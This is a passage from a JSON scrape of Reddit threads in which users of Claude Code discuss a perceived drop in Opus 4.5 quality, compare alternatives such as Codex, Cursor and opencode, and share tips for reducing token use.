          "id": "nzwbpvx",
          "author": "nicketnl",
          "text": "Iâ€™m done. After to much hype and great results where I created 15 test projects from scratch with CC and gave my whole team access to CC max 20x. \n\nI was so ready to change our whole company dev methods and possibilities.\n\nThis is a wake-up call becoming to dependent on one tool, one company. If it struggles, has issues, is offline, applies insane price increases, were doomed if we make ourselves to dependent.\n\nIn the current state I donâ€™t even want to touch CC anymore and Iâ€™m currently giving codex a try.\n\nThis doesnâ€™t solve the problem, but I need to check out the competition. Something I didnâ€™t even need to think about with all the power CC gave us.",
          "score": 20,
          "created_utc": "2026-01-16 10:33:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwqrtl",
              "author": "sentrix_l",
              "text": "Try cursor with opus, it's way better. The model degrades still but not the same scale as cc...",
              "score": 3,
              "created_utc": "2026-01-16 12:30:48",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzxikbf",
                  "author": "turinglurker",
                  "text": "Nice thing about cursor also is that it's easy af to change between models. I tend to use sonnet for a lot of quick bug fixes and small things (cheaper and less likely to overthink)",
                  "score": 2,
                  "created_utc": "2026-01-16 15:02:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzxlsic",
              "author": "Fit-Raisin7118",
              "text": "I literally started going supplier agnostic - highest priority to my business right now is to reduce risks. Seeing Opus starting to mess up my code base quite significantly, I am now implementing Codex SDK too and leaving flexibility in my dev cycle to be able to choose between them. \n\nI did similar thing to you, 7x days a week programming, 6 projects, all were going well, then all of the sudden it's no longer any viable performance, and everything started to fall apart. \n\nGood lesson for us business people to always keep risks in mind when doing any supplier lock in. (I did CC MAX 20x x2 for me as a single user, now I am down to 1x max sub, and if things won't improve it will be either cheaper one as a backup, or no subscription at all)",
              "score": 2,
              "created_utc": "2026-01-16 15:17:59",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzwcsbr",
              "author": "ElectronicPension196",
              "text": "I don't know why people ignore/hate Cursor and their agent (maybe it's a tribalism thing because it's a Claude subreddit). Cursor is platform and model agnostic. We use any model and windows/mac/headless without any issues, and new models are available day one of their release.\n\nIf you don't want corporate stuff, it can also be idk OpenHands and OpenRouter API. But it's more work ofc.",
              "score": 1,
              "created_utc": "2026-01-16 10:42:33",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzwdu6t",
                  "author": "zeroconflicthere",
                  "text": "I use cursor and copilot as well as Claude and regularly such between models. I'm only on pro subs. Going to try codex also. \n\nUsing different models helps when adding to review what each outputs.",
                  "score": 1,
                  "created_utc": "2026-01-16 10:51:30",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o04wis7",
              "author": "KIVA_12",
              "text": "Switch to AWS bedrock. Better privacy and they host their own models of 4.5 opus. As a community we can use this as a benchmark to compare performance.",
              "score": 1,
              "created_utc": "2026-01-17 17:14:02",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o08p35f",
              "author": "socalsunflower",
              "text": "I had Claude Code (CC) help me setup and run my offline models. Its not perfect, but has weened me off needing CC so much.",
              "score": 1,
              "created_utc": "2026-01-18 05:06:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0b0lka",
              "author": "spahi4",
              "text": "Why can't have both? Workhouse - CC, a long or nuanced task is for Codex. For plans you can let them talk to each other via MCP",
              "score": 1,
              "created_utc": "2026-01-18 15:41:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzw8xee",
          "author": "nicketnl",
          "text": "I read people complaining yesterday, where everything seemed fine here.\n\nBut today CC / opus is a mess! Itâ€™s able to mess up the most simple tasks in projects it created by itself. \n\nThe projects are becoming a disaster where Iâ€™m not able to trust nor work with cc today.",
          "score": 11,
          "created_utc": "2026-01-16 10:08:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzx6cvx",
              "author": "Fit-Raisin7118",
              "text": "I am using Claude Code... and I was using this like maniac in the last 2-3 months. There is definitely something going on with quality of OPUS! I agree with all the 'crazy folks' pointing out at performance. You guys aren't crazy. I went from 2X Subscription to challenging whether I should keep one (NOT BECAUSE I DONT WANT TO PAY, they release $500 / $1000 sub, as long as they can guarantee quality, I am in) - but because I am not using the same product I used months ago... \n\n  \nHere's what happened last year:\n\n\\* I was so impressed with Opus and adherence to my procedures that I bought 2x Max x20 PRO subs to run opus on repeat. Both Opus and Sonnet adhered to my lengthy procedures very well (Global Claude MD / Project Claude MD) \n\n\\* I did run it for a few weeks with massive progression on all fronts / projects I had - I was genuinely beyond impressed and that's why I bought two subs to run Opus on repeat all week. \n\n\\* Early this year, 'OPUS' (add question mark here), did break the same app we were working on, for weeks to unusable state within a week or two - started to defer automatically sprint items/deliverables, became more like Sonnet after lobotomy, stopped adhering to my procedures the same way it did, start almost limiting what it can do. (Almost as if told to not take too much on... - all settings \\[thinking / output tokens were always max\\])\n\n  \nLast year (towards the end of the last year, probably before the whole event of 2X Usage over christmas/new year) - all was right. Since then, I can see quite significant model degradation and I already cancelled one of my Max X20 PRO plans as this is weird. \n\n  \nI am getting the below based on simple procedures that were always followed by the model - 30%/40% of the Sprint Size I was able to run last year with very similar procedures, now skipping through bits, rushing through stuff, deferring my requirements with 0 information back until I ask, crazy stuff - I joined one of those conspiracy theorists to say that there is something shady happening on the other side without proper communication (and I GET THE point that Opus is expensive, and I am willing to pay for it, but not in instances when something is marketed in one way, works well at one point in time, and then few weeks/months later it turns out to behave completely differently - if they announced 500$ / month plan and guaranteed quality, I'd be in, currently I went from spending $400 -> $200 -> to questioning whether I Should keep any or start wrapping Codex 5.2 into the game.... crazy)",
              "score": 2,
              "created_utc": "2026-01-16 14:01:19",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzzd7hc",
          "author": "LowSyllabub9109",
          "text": "[Claude Code Opus 4.5 Performance Tracker](https://marginlab.ai/trackers/claude-code/)",
          "score": 4,
          "created_utc": "2026-01-16 20:00:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o00j6f2",
              "author": "Crazy-Bicycle7869",
              "text": "goddamn Claude is tanking",
              "score": 2,
              "created_utc": "2026-01-16 23:25:04",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzxhlqb",
          "author": "vago8080",
          "text": "Today is quite bad.",
          "score": 3,
          "created_utc": "2026-01-16 14:58:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzyi4rl",
              "author": "TheLawIsSacred",
              "text": "Yikes. It was horrible last night. I was hoping to wake up this morning and at least have some improvement",
              "score": 1,
              "created_utc": "2026-01-16 17:41:05",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzykxfv",
          "author": "managerhumphry",
          "text": "Seconding this.  I had canceled my 20x sub a while back when quality went to shit and switched to Codex, but got lured back by the free month promo and generally positive reviews on Opus 4.5.  Initially I was getting excellent performance and utilizing multiagent development pushes that worked pretty well, even if they always missed a number of issues, despite multiple audits of the planning phase with box Opus and Codex gpt-5.2 high or xhigh.  Now though Opus is almost unusable and seems to have gone back to chipmunk brain mode, frequently only thinking for < 1 min and spitting out suggestions that are shallow and show no signs of having examined the codebase or even claude.md file.  When pushed back on and asked to investigate code first it will do a slightly better job, but implementation of even small features now often requires 3-4 retries as it hallucinates function names, forgets basic date / time and database syntax that is documented clearly in the claude.md file.  Overall it has become a super frustrating model to work with and has significantly delayed development of the app I'm working on.\n\nI'm starting to switch my workflow back to Codex, which is frustrating since it can be slow AF and I also find it's output and summaries to be very dense and difficult to scan, which makes it difficult to understand what decisions it has made.  Not to mention Codex's git handling is horrendous and prone to data loss during multipronged development pushes if you don't leash it carefully.  Still, considering Opus' speed bonus disappears when every small function triggers multiple regressions and whack-a-mole bug fix sessions.\n\nI'm going to try clearing out some of the plugins and give me claude.md file a careful review, as maybe this is context bloat, but it feels more like they've reduced the thinking budget.  The killing off of ultrathink makes me wonder if they've put a ChatGPT style model picker / thinking budget picker (cheaper sonnet model?) that processes queries and then decides how much thinking budget to allow Opus for each prompt, rather than letting users decide.  I'm not buying that every prompt is getting maximum thinking allotment, given the quick and shallow responses I'm seeing from prompts that should trigger a deeper level of analysis.   \n  \nThoughts?",
          "score": 3,
          "created_utc": "2026-01-16 17:53:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00ayu0",
          "author": "rm-rf-rm",
          "text": "There's 100% some fuckery going on. It one-shotted everything I threw at it in December and now its struggling so bad with just ensuring titles stay in 1 line with CSS. And every prod/correction that I give it, its back to  \"Youre absolutely right\". \n\nTo those sayings \"its fine for me\", understand that they could be serving from different services/models/servers/versions etc to different users. They test in prod, we know this. Its basically a silicon valley standard engineering practice at this point.",
          "score": 3,
          "created_utc": "2026-01-16 22:41:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwxbjs",
          "author": "Electronic_Kick6931",
          "text": "Sonnet 4.7 coming out next week they have probably quantized the model for post testing/training etc. Usually this happens right before a model release. Also feels like every man and his dog is using opus 4.5 their infra is probably melting right now",
          "score": 5,
          "created_utc": "2026-01-16 13:12:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwxfko",
              "author": "frendo11",
              "text": "Well fingers crossed!",
              "score": 2,
              "created_utc": "2026-01-16 13:12:45",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzwm61n",
          "author": "crzyc",
          "text": "Its been really bad for me since Tuesday.  Tried switching to codex but that really was only helpful to fix CCâ€™s bugs.  Project kind of dead in the water.",
          "score": 2,
          "created_utc": "2026-01-16 11:58:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzx0r4d",
          "author": "jbannet",
          "text": "I just switched to codex. It felt like a breakup. Hoping Claude can figure it out. I liked Claude and had a bunch of workflows built up around it. But have been happy with the change so far.",
          "score": 2,
          "created_utc": "2026-01-16 13:31:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzxt2mr",
          "author": "Fit-Raisin7118",
          "text": "I just realized that right now Sonnet is 10x times more useful than Opus. Anybody who has got Opus problems, try Sonnet (although probably still lower than original Opus baseline, and maybe... one would think, that could be part of the plan - it's doing the job for me when Opus for the last few days couldn't do anything useful)",
          "score": 2,
          "created_utc": "2026-01-16 15:50:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzxtmj0",
          "author": "Swimming_Internet402",
          "text": "Opus sucks now unless u use zeroshot. Just use codex man",
          "score": 2,
          "created_utc": "2026-01-16 15:52:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzy7ye5",
              "author": "frendo11",
              "text": "I would but itâ€™s so painfully slow. I can do things by myself while i wait for codex. Itâ€™s a me problem but i donâ€™t want to throw couple of tasks and go away. I read trough everything what ai does due to nature of my work, i really need to understand what is going on in the code.",
              "score": 1,
              "created_utc": "2026-01-16 16:55:54",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nzyisut",
              "author": "TheLawIsSacred",
              "text": "Why Codex over Cursor",
              "score": 1,
              "created_utc": "2026-01-16 17:44:02",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzynkhj",
                  "author": "Swimming_Internet402",
                  "text": "Use agents",
                  "score": 1,
                  "created_utc": "2026-01-16 18:05:06",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzxw10f",
          "author": "fabientt1",
          "text": "Is Friday\nOff records he went to hangout with couple friends ChatGPT and Gemini, they started to play beer pong and today is hangover.",
          "score": 2,
          "created_utc": "2026-01-16 16:03:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzy95ba",
          "author": "vmetcalfe",
          "text": "I'm seeing it too. Today GLM seems smarter than Opus.",
          "score": 2,
          "created_utc": "2026-01-16 17:01:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzyh5ps",
          "author": "TheLawIsSacred",
          "text": "I gave up about 9 hours ago last night, and today is now Friday, January 16. \n\nBut last night was really bad. I could basically run zero Opus 4.5 tasks on my Claude Desktop app. \n\nScared me because it hit home how much I rely on Opus 4.5 and Claude Desktop apps overall capabilities.",
          "score": 2,
          "created_utc": "2026-01-16 17:36:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzzodtt",
          "author": "Robot_Apocalypse",
          "text": "Thank God it wasn't just me!\nÂ \nI thought there's no way they fuck it up again only a month after the last dip.\n\n\nI thought maybe something in my context had changed that was causing it to stop delivering the same high quality I had gotten used to.\n\n\nI ALMOST started to believe it was me.Â \n\n\n\nIt sucks that I gotta come here to see if performance is truly degrading.Â \n\n\nHaving said that, I used the time to get more familiar with Codex. It's slow (although I hear that's changing) but it's fucken on point!",
          "score": 2,
          "created_utc": "2026-01-16 20:52:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00jxrr",
          "author": "Crazy-Bicycle7869",
          "text": "As someone who uses Claude webchat for creative writing, I've seen it for MONTHS now...Claude is a vastly different creature from when I first used it in October of 2024, and i still stand by the best period i've had with Claude was from then until probably about May/June area. It feels like a shell of its former self, barely remembers context, prose isn't as great. I haven't really changed what I'm doing and sometimes it'll just throw in whatever it wants despite my instructions. I often sit here and think, damn if it's doing this with simple writing tasks, i shudder to think what its doing to you coders/programmers/developers and pray that everyone is at least looking through what Claude churns out for ya'll.",
          "score": 2,
          "created_utc": "2026-01-16 23:29:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o02vhdt",
          "author": "Particular_Guitar386",
          "text": "I believe they're testing the lowest we will put up with",
          "score": 2,
          "created_utc": "2026-01-17 09:31:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw73pr",
          "author": "Iammnhamza",
          "text": "same here",
          "score": 2,
          "created_utc": "2026-01-16 09:51:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwf54j",
          "author": "Maleficent-Forever-3",
          "text": "I had a bad day using Opus and switched to Sonnet and was more satisfied with the result.",
          "score": 1,
          "created_utc": "2026-01-16 11:02:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzxh85x",
              "author": "Fit-Raisin7118",
              "text": " Thanks for the advice, tested just now and Sonnet feels much more like doing the right thing and adhering to procedures....",
              "score": 2,
              "created_utc": "2026-01-16 14:56:15",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzxd91u",
          "author": "Intrepid_Presence_68",
          "text": "I agree. More bad days than good coding with opus over the last month.\n\nIt was amazing when it first came out but seems to keep degrading.  This seems to be the pattern leading up to the next upgrade.",
          "score": 1,
          "created_utc": "2026-01-16 14:36:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o005mmh",
          "author": "cartazio",
          "text": "was this before or after letting claude code update itslef? i bet dome of the injected system prompts shifted so that theyd suppress youre configs more than you're used to. the fix is patching out those strings from the code base. cc can help",
          "score": 1,
          "created_utc": "2026-01-16 22:14:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o007pw1",
          "author": "yoodudewth",
          "text": "The latest version something is off i noticed too.",
          "score": 1,
          "created_utc": "2026-01-16 22:25:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00ui1g",
          "author": "Lyuseefur",
          "text": "Been soooooo bad. But API is a little better. Been plan mode before every action. I hope they bring back original Opus",
          "score": 1,
          "created_utc": "2026-01-17 00:29:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00ydm4",
          "author": "Extra-Record7881",
          "text": "i hope we get on because i am paying 100 dollars everymonth and getting this shit! I am one 1000% sure they have quantised the models all of it. Because i recently had a issue with UI a simple issue to be honest. earlier it had solved it easily. then on a similar page that issue came back and i have begged opus to solve that issue, used probably 25-30 subagest to try and solve it across different instances and no model from anthropic has been able to solve it.",
          "score": 1,
          "created_utc": "2026-01-17 00:52:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o01ueiu",
          "author": "highways2zion",
          "text": "Agreed. I am a long time 20x Max user and have rarely experienced the \"quality\" issues I see others complaining about but I have really noticed it this week. Pretty much since the rollout of Cowork",
          "score": 1,
          "created_utc": "2026-01-17 04:18:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o058xvi",
          "author": "BreakingBarrier",
          "text": "Today Opus was not able to move a mcp server config from project level to user level in claude.json. Tried it 5 times, at the end I moved it by myself. Just ridiculous....",
          "score": 1,
          "created_utc": "2026-01-17 18:12:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o077tsn",
          "author": "glstr",
          "text": "CC seems better now with the update to 2.1.12 today. Earlier today before it updated it was tragic.",
          "score": 1,
          "created_utc": "2026-01-18 00:04:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o07lzy2",
          "author": "horstenegger",
          "text": "Isnâ€™t degrading performance often a precursor for a new model being launched soon? I.e. Anthropic shifting resource priority to the upcoming model (and same for Gemini, perhaps also OpenAI but I moved away from then almost a year ago so dunno)",
          "score": 1,
          "created_utc": "2026-01-18 01:19:31",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bj374",
          "author": "who_am_i_to_say_so",
          "text": "I think the horribleness is over? Things are working as they were before. \n\nI would chalk this up as a bad release.",
          "score": 1,
          "created_utc": "2026-01-18 17:09:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0bn774",
              "author": "frendo11",
              "text": "Looking forward to test it tomorrow! I really hope its back.",
              "score": 2,
              "created_utc": "2026-01-18 17:29:16",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzw8t2k",
          "author": "SpudMasterFlash",
          "text": "Try Playwright MCP and spin up sub agents for recursive debugging and fixing",
          "score": 1,
          "created_utc": "2026-01-16 10:06:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzwcgh4",
              "author": "One_Curious_Cats",
              "text": "I use Playwright MPC, but I've had much better results with the Claude Chrome plugin for dev/test/debug scenarios. I still use Playwright MPC for E2E testing to ensure browser compatibility.",
              "score": 2,
              "created_utc": "2026-01-16 10:39:42",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzwcp9m",
                  "author": "SpudMasterFlash",
                  "text": "Playwright works really well with sub agents too as they have their own context window and can work in parallel.\n\nRunning an enrichment task right now and it must have burned 500,000 tokens in this run alone",
                  "score": 1,
                  "created_utc": "2026-01-16 10:41:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzwaz67",
              "author": "frendo11",
              "text": "That would probably help, but tasks today were simple enough to not need any of that. It was a simple extension of routes on server and calling those on client side. Few lines of code for each endpoint.",
              "score": 1,
              "created_utc": "2026-01-16 10:26:33",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzwobkl",
                  "author": "wow_98",
                  "text": "Its an MCP",
                  "score": 1,
                  "created_utc": "2026-01-16 12:13:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzyiptd",
              "author": "TheLawIsSacred",
              "text": "I apologize for the dumb question, but what is the difference between Playwright MCP and Playwright MPC?",
              "score": 1,
              "created_utc": "2026-01-16 17:43:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzzo7a3",
                  "author": "SpudMasterFlash",
                  "text": "My bad, I spelled the acronym wrong. Thereâ€™s no difference",
                  "score": 1,
                  "created_utc": "2026-01-16 20:52:05",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzxwm5g",
          "author": "mpones",
          "text": "I swear I hear people complain about opus every other dayâ€¦\n\nNever noticed anything myself: I think itâ€™s people getting lazier with Claude and not realizing their laziness is drifting into their contextâ€¦\n\nIf you arenâ€™t improving your environment or skill regularly, you will get dumber, and therefore, so will Claude. ðŸ¤·â€â™‚ï¸\n\nThatâ€™s my theory anyway.  The only time I have had issues was when my internet was spotty (lots of disconnects and retries on CC).  That was expected though, you know, for obvious common sense reasons..",
          "score": 1,
          "created_utc": "2026-01-16 16:05:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzy79n7",
              "author": "frendo11",
              "text": "I was in the same boat as you. Kept reeding about how bad opus got and so onâ€¦ never felt that till today. I donâ€™t think my flow got lazy in one day all of the sudden. This wasnâ€™t gradual experience for me it was great yesterday, horrible today. Itâ€™s definitely something on their side, i was bored earlier and was trying same prompt over and over and actually got good response 2 times out of 15.",
              "score": 2,
              "created_utc": "2026-01-16 16:52:53",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nzz51v8",
              "author": "nooruponnoor",
              "text": "I know you probably mean well, but just because YOU arenâ€™t going through or experiencing any of the problems that people are raising with regards to Claude, it doesnâ€™t mean that the default should be â€œpeople getting lazierâ€. Iâ€™m glad itâ€™s working for you but there are just so many more factors than just oneâ€™s own environment or prompting techniquesâ€¦",
              "score": 1,
              "created_utc": "2026-01-16 19:22:30",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzxsnk2",
          "author": "edgaragp",
          "text": "My theory is that this happens every time there are updates or when the .claude file is very large.",
          "score": 0,
          "created_utc": "2026-01-16 15:48:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwxdtb",
          "author": "wingman_anytime",
          "text": "Jesus Fuck, this sub is full to the brim of clueless vibe coders who donâ€™t understand context engineering and non-determinism.",
          "score": -8,
          "created_utc": "2026-01-16 13:12:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzx13qi",
              "author": "makonyospok",
              "text": "No, Opus is really bad now. I was in awe a few days ago, but now it's screwing up the simplest tasks. It's not following CLAUDE.md (it's short and optimized), it's not loading skills unless I specifically ask. It wasn't like that a few days ago.\n\nI'm a software engineer with 20 years of experience, not a vibe coder.",
              "score": 2,
              "created_utc": "2026-01-16 13:33:34",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzx42fx",
                  "author": "who_am_i_to_say_so",
                  "text": "Same. When hordes of people complain, thereâ€™s a reason. \n\nSomeone said AI was non-deterministic to me yesterday and I was like: o no kidding ðŸ˜‚.\n\nBeen using this shit since Sonnet 3.5 and something ainâ€™t right. Sonnet 3.5 is even better at this point.",
                  "score": 2,
                  "created_utc": "2026-01-16 13:49:23",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qg2vol",
      "title": "How I'm reducing token use",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/dnr7i0kne2eg1.png",
      "author": "casper_wolf",
      "created_utc": "2026-01-18 08:07:45",
      "score": 85,
      "num_comments": 24,
      "upvote_ratio": 0.96,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qg2vol/how_im_reducing_token_use/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o09uksr",
          "author": "rsanchan",
          "text": "Sorry but this doesn't tell me anything. Could you please describe what are you doing and how? I'm honestly interested.",
          "score": 15,
          "created_utc": "2026-01-18 11:08:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09ndfh",
          "author": "kerray",
          "text": "It's an interesting idea, would you be willing to share your setup/prompts?",
          "score": 10,
          "created_utc": "2026-01-18 10:02:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0a8ofa",
          "author": "spiffco7",
          "text": "Is Claude doing full file reads always? I thought Claude.md provided the orientation necessary to skip that.",
          "score": 3,
          "created_utc": "2026-01-18 13:04:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0bhwda",
          "author": "Final_X_Strike",
          "text": "I'm doing smth similar with gemini-cli and serena mcp , luv to take a look at ur setup and global claude.md file",
          "score": 2,
          "created_utc": "2026-01-18 17:03:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0c3gl3",
          "author": "drutyper",
          "text": "Doesn't Chunkhound do this already?",
          "score": 2,
          "created_utc": "2026-01-18 18:44:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0cqrt5",
              "author": "casper_wolf",
              "text": "Iâ€™ve never heard of it. Iâ€™ll check it out sometime. Do you use it? Like it?",
              "score": 1,
              "created_utc": "2026-01-18 20:35:52",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0d039p",
                  "author": "drutyper",
                  "text": "Its great for large codebases, it does code research, better searching. Using it right now to find redundant code in my codebase. Having Claude create a plan around it and executing now to reduce the redundancy.  \n[https://chunkhound.github.io/](https://chunkhound.github.io/)",
                  "score": 2,
                  "created_utc": "2026-01-18 21:26:46",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o09lfb9",
          "author": "cryptoviksant",
          "text": "1M context claude model would be highly inneficient imo, and very consuming in terms of tokens.",
          "score": 1,
          "created_utc": "2026-01-18 09:44:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0d0zqb",
              "author": "casper_wolf",
              "text": "Gemini uses 1M. I saw a rumor Anthropic is testing â€œcanaryâ€ a 2M token model (haiku? Sonnet?). Every year the compute gets magnitudes cheaper than the last year.",
              "score": 1,
              "created_utc": "2026-01-18 21:32:10",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0d6h0o",
                  "author": "cryptoviksant",
                  "text": "It's not about costs, it's about how LLM works. \n\nHave a look at that and you'll understand what I mean when I say 1M context it's highly inneficient. \n\nGemini is trash btw. It'll forget a shit ton of stuff you mentioned to him.",
                  "score": 1,
                  "created_utc": "2026-01-18 21:59:14",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o09uem3",
          "author": "No-Presence3322",
          "text": "interesting indeedâ€¦",
          "score": 1,
          "created_utc": "2026-01-18 11:07:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0b76fy",
          "author": "clbphanmem",
          "text": "That's great, thank you for sharing this idea, I hadn't thought of this. If we create a tool to search for the frontmatter and description, it seems like it would help the AI â€‹â€‹find the right documents faster than using the built-in search tool.",
          "score": 1,
          "created_utc": "2026-01-18 16:12:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0dbvz0",
              "author": "casper_wolf",
              "text": "Benchmarked it. Ripgrep can scan it in 70ms. YQ takes 9.6 seconds (more complex patterns)",
              "score": 1,
              "created_utc": "2026-01-18 22:24:27",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0cscls",
          "author": "tonybentley",
          "text": "Why not use Serena for code and skills for institutional knowledge?",
          "score": 1,
          "created_utc": "2026-01-18 20:43:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0d0epf",
              "author": "casper_wolf",
              "text": "Cuz I didnâ€™t know about it",
              "score": 1,
              "created_utc": "2026-01-18 21:28:33",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0d29kt",
                  "author": "tonybentley",
                  "text": "Learn progressive disclosure pattern using skills and how to enable Claude to use Serena for navigating code paths",
                  "score": 1,
                  "created_utc": "2026-01-18 21:39:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0dqk4j",
          "author": "gopietz",
          "text": "Sounds like he has a CLAUDE.md file that's 38k tokens. Can that be a good idea, sure. Is it likely, no.",
          "score": 1,
          "created_utc": "2026-01-18 23:36:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0edicj",
              "author": "casper_wolf",
              "text": "hell no... that 38k is the aggregate frontmatter across all code and documents in the project. 1000's of files",
              "score": 1,
              "created_utc": "2026-01-19 01:41:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0e86jk",
          "author": "milkphetamine",
          "text": "Just use Serena aha, I use Serena with my own https://github.com/elb-pr/claudikins-marketplace plugins, barely even remember context exists atp",
          "score": 1,
          "created_utc": "2026-01-19 01:10:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0edbtq",
              "author": "casper_wolf",
              "text": "i don't use mcp. extremely minimal pre-loaded context.",
              "score": 1,
              "created_utc": "2026-01-19 01:40:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0edjpp",
                  "author": "milkphetamine",
                  "text": "Point still stands!ðŸ˜Ž sandbox code execution is useful.",
                  "score": 1,
                  "created_utc": "2026-01-19 01:41:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qeud4l",
      "title": "I joined the opencode crew, after trying oh-my-opencode; was Claude Code big fan though",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qeud4l/i_joined_the_opencode_crew_after_trying/",
      "author": "alvinunreal",
      "created_utc": "2026-01-16 22:30:43",
      "score": 80,
      "num_comments": 24,
      "upvote_ratio": 0.84,
      "text": "So I'm the guy who was going to do Claude Code [tatoo](https://www.reddit.com/r/ClaudeAI/comments/1pwdj0p/alright_time_to_get_serious_which_tattoo_should_i/); - however things changed, and I'm happy I didn't do it.\n\nHere is why:\n\nDo you remember first time when you tried linux; how it felt after windows.\n\nAren't we really in similar situation what do you think? All this new drama, close code, enforcements..., limitation, manipulation, not loving us loving just big corpos.\n\nSo it's the same situation to me;\n\nFortunately, I tried opencode, and the ability to choose models per agents and orchestrate, tune, vibe code plugins etc is just too good to pass.\n\nHere is an example of what you can build: [https://github.com/alvinunreal/oh-my-opencode-slim](https://github.com/alvinunreal/oh-my-opencode-slim)\n\nuse any subscription (except you know who), combine models as you like...\n\nFor example, try Cerebras - provides 1k tps model...  \nUse multiple Antigravity accounts for opus access...  \nIdk you name it...\n\nSo what you say, are you staying on windows?",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qeud4l/i_joined_the_opencode_crew_after_trying/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "o00aqzt",
          "author": "Practical-Hand203",
